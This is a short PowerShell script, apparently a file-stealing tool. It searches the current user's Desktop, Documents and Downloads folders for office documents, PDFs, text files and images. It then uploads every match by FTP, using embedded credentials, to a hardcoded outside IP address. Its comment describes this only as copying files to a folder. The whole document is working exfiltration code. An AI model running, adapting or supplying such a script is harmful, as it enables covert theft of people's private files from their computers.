$src =  "C:\Users\$env:username\desktop","C:\Users\$env:username\Documents","C:\Users\$env:username\Downloads"
#copy files to one folder
foreach($file in Get-ChildItem -path $src -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg -Recurse){    
    
    $uploadFile=$file.FullName; $ftp='ftp://testadmin:testpassword@192.119.71.89/$file.Name'; $client=New-Object -TypeName System.Net.WebClient; $URI=New-Object -TypeName System.Uri -ArgumentList $ftp; $client.UploadFile($URI,$uploadFile)
}


